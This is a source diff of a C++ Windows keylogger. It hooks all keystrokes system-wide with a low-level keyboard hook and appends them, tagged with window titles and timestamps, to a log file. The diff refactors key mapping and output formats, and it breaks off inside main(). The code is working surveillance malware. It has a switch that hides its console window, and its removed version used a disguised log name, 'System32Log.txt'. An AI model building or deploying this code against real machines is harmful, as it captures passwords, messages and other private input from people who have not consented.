@@ -1,15 +1,55 @@
 #include <Windows.h>
-#include <time.h>
-#include <iostream>
 #include <cstdio>
 #include <fstream>
+#include <iostream>
+#include <sstream>
+#include <time.h>
+#include <map>
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
 #define visible // (visible / invisible)
-
+// defines which format to use for logging
+// 0 for default, 10 for dec codes, 16 for hex codex
+#define FORMAT 0
+// defines if ignore mouseclicks
+#define mouseignore
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
+
+#if FORMAT == 0
+const std::map<int, std::string> keyname{ 
+	{VK_BACK, "[BACKSPACE]" },
+	{VK_RETURN,	"\n" },
+	{VK_SPACE,	"_" },
+	{VK_TAB,	"[TAB]" },
+	{VK_SHIFT,	"[SHIFT]" },
+	{VK_LSHIFT,	"[LSHIFT]" },
+	{VK_RSHIFT,	"[RSHIFT]" },
+	{VK_CONTROL,	"[CONTROL]" },
+	{VK_LCONTROL,	"[LCONTROL]" },
+	{VK_RCONTROL,	"[RCONTROL]" },
+	{VK_MENU,	"[ALT]" },
+	{VK_LWIN,	"[LWIN]" },
+	{VK_RWIN,	"[RWIN]" },
+	{VK_ESCAPE,	"[ESCAPE]" },
+	{VK_END,	"[END]" },
+	{VK_HOME,	"[HOME]" },
+	{VK_LEFT,	"[LEFT]" },
+	{VK_RIGHT,	"[RIGHT]" },
+	{VK_UP,		"[UP]" },
+	{VK_DOWN,	"[DOWN]" },
+	{VK_PRIOR,	"[PG_UP]" },
+	{VK_NEXT,	"[PG_DOWN]" },
+	{VK_OEM_PERIOD,	"." },
+	{VK_DECIMAL,	"." },
+	{VK_OEM_PLUS,	"+" },
+	{VK_OEM_MINUS,	"-" },
+	{VK_ADD,		"+" },
+	{VK_SUBTRACT,	"-" },
+	{VK_CAPITAL,	"[CAPSLOCK]" },
+};
+#endif
 HHOOK _hook;
 
 // This struct contains the data received by the hook callback. As you see in the callback function
@@ -17,11 +57,9 @@ HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
-std::ofstream OUTPUT_FILE;
+std::ofstream output_file;
 
-extern char lastwindow[256];
-
-// This is the callback function. Consider it the event that is raised when, in this case, 
+// This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -32,7 +70,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			
+
 			// save to file
 			Save(kbdStruct.vkCode);
 		}
@@ -50,7 +88,9 @@ void SetHook()
 	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
-		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+		LPCWSTR a = L"Failed to install hook!";
+		LPCWSTR b = L"Error";
+		MessageBox(NULL, a, b, MB_ICONERROR);
 	}
 }
 
@@ -59,117 +99,111 @@ void ReleaseHook()
 	UnhookWindowsHookEx(_hook);
 }
 
+
 int Save(int key_stroke)
 {
-    char lastwindow[256];
-    
+	std::stringstream output;
+	static char lastwindow[256] = "";
+#ifndef mouseignore 
 	if ((key_stroke == 1) || (key_stroke == 2))
+	{
 		return 0; // ignore mouse clicks
-	
+	}
+#endif
 	HWND foreground = GetForegroundWindow();
-    DWORD threadID;
-    HKL layout;
-    if (foreground) {
-        //get keyboard layout of the thread
-        threadID = GetWindowThreadProcessId(foreground, NULL);
-        layout = GetKeyboardLayout(threadID);
-    }
+	DWORD threadID;
+	HKL layout = NULL;
 
-    if (foreground)
-    {
-        char window_title[256];
-        GetWindowText(foreground, window_title, 256);
-        
-        if(strcmp(window_title, lastwindow)!=0) {
-            strcpy(lastwindow, window_title);
-            
-            // get time
-            time_t t = time(NULL);
-            struct tm *tm = localtime(&t);
-            char s[64];
-            strftime(s, sizeof(s), "%c", tm);
-            
-            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] ";
-        }
-    }
+	if (foreground)
+	{
+		// get keyboard layout of the thread
+		threadID = GetWindowThreadProcessId(foreground, NULL);
+		layout = GetKeyboardLayout(threadID);
+	}
 
+	if (foreground)
+	{
+		char window_title[256];
+		GetWindowTextA(foreground, (LPSTR)window_title, 256);
 
-	std::cout << key_stroke << '\n';
+		if (strcmp(window_title, lastwindow) != 0)
+		{
+			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
 
-	if (key_stroke == VK_BACK)
-        OUTPUT_FILE << "[BACKSPACE]";
-	else if (key_stroke == VK_RETURN)
-		OUTPUT_FILE <<  "\n";
-	else if (key_stroke == VK_SPACE)
-		OUTPUT_FILE << " ";
-	else if (key_stroke == VK_TAB)
-		OUTPUT_FILE << "[TAB]";
-	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-		OUTPUT_FILE << "[SHIFT]";
-	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		OUTPUT_FILE << "[CONTROL]";
-	else if (key_stroke == VK_ESCAPE)
-		OUTPUT_FILE << "[ESCAPE]";
-	else if (key_stroke == VK_END)
-		OUTPUT_FILE << "[END]";
-	else if (key_stroke == VK_HOME)
-		OUTPUT_FILE << "[HOME]";
-	else if (key_stroke == VK_LEFT)
-		OUTPUT_FILE << "[LEFT]";
-	else if (key_stroke == VK_UP)
-		OUTPUT_FILE << "[UP]";
-	else if (key_stroke == VK_RIGHT)
-		OUTPUT_FILE << "[RIGHT]";
-	else if (key_stroke == VK_DOWN)
-		OUTPUT_FILE << "[DOWN]";
-	else if (key_stroke == 190 || key_stroke == 110)
-		OUTPUT_FILE << ".";
-	else if (key_stroke == 189 || key_stroke == 109)
-		OUTPUT_FILE << "-";
-	else if (key_stroke == 20)
-		OUTPUT_FILE << "[CAPSLOCK]";
-	else {
-        char key;
-        // check caps lock
-        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+			// get time
+			time_t t = time(NULL);
+			struct tm tm;
+			localtime_s(&tm, &t);
+			char s[64];
+			strftime(s, sizeof(s), "%c", &tm);
 
-        // check shift key
-        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
-            lowercase = !lowercase;   
-        }
+			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
+		}
+	}
 
-        //map virtual key according to keyboard layout 
-        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
-        
-        //tolower converts it to lowercase properly
-        if (!lowercase) key = tolower(key);
-		OUTPUT_FILE <<  char(key);
-    }
-	//instead of opening and closing file handlers every time, keep file open and flush.
-    OUTPUT_FILE.flush();
+#if FORMAT == 10
+	output << '[' << key_stroke << ']';
+#elif FORMAT == 16
+	output << std::hex << "[" << key_stroke << ']';
+#else
+	if (keyname.find(key_stroke) != keyname.end())
+	{
+		output << keyname.at(key_stroke);
+	}
+	else
+	{
+		char key;
+		// check caps lock
+		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+		// check shift key
+		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+		{
+			lowercase = !lowercase;
+		}
+
+		// map virtual key according to keyboard layout
+		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+
+		// tolower converts it to lowercase properly
+		if (!lowercase)
+		{
+			key = tolower(key);
+		}
+		output << char(key);
+	}
+#endif
+	// instead of opening and closing file handlers every time, keep file open and flush.
+	output_file << output.str();
+	output_file.flush();
+
+	std::cout << output.str();
+
 	return 0;
 }
-
 void Stealth()
 {
-	#ifdef visible
-		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-	#endif // visible
+#ifdef visible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+#endif
 
-	#ifdef invisible
-		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-	#endif // invisible
+#ifdef invisible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+#endif
 }
 
 int main()
 {
-	//open output file in append mode
-    OUTPUT_FILE.open("System32Log.txt",std::ios_base::app);	
+	// open output file in append mode
+	const char* output_filename = "keylogger.log";
+	std::cout << "Logging output to " << output_filename << std::endl;
+	output_file.open(output_filename, std::ios_base::app);
 
 	// visibility of window
 	Stealth();
 
-	// Set the hook
+	// set the hook
 	SetHook();
 
 	// loop to keep the console application running.
